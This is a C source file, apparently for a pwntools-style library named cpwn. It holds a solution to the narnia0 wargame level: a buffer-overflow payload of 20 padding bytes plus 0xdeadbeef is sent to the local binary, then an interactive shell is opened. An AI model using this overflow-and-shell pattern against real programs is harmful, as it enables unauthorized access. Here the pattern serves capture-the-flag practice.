#include "src/process.h"
#include "src/pstr.h"
#include "src/utils.h"
#include "src/tests.h"
#include "src/sock.h"
#include <assert.h>
#include "src/tube.h"

void narnia0() {
    // Spawn process
    Tube* p = pwn_process("./narnia0");

    // Almost all string in cpwn are handled by a custom dynamic string library `pstr`, which 
    // can handle binary safe strings (null terminator \x00 is threated like a regular char).
    // Below expression builds a payload. pstr_load() is a function which bundles multiple pstr pointers
    // Both pstr_new and pwn_64 returns a pstr*
    pstr* payload = pstr_load(
        pstr_new("KKKKKKKKKKKKKKKKKKKK"),
        pwn_p64(0xdeadbeef, "little")
    ); 

    // Send payload to process
    pwn_sendline(p, payload);

    // Spawn an interative shell
    pwn_interactive(p);
}


void narnia1() {

}

int main() {
    tests();
}



void tests() {
    pstr_test();
    //process_test();
    utils_test();    
    remote_test();
}
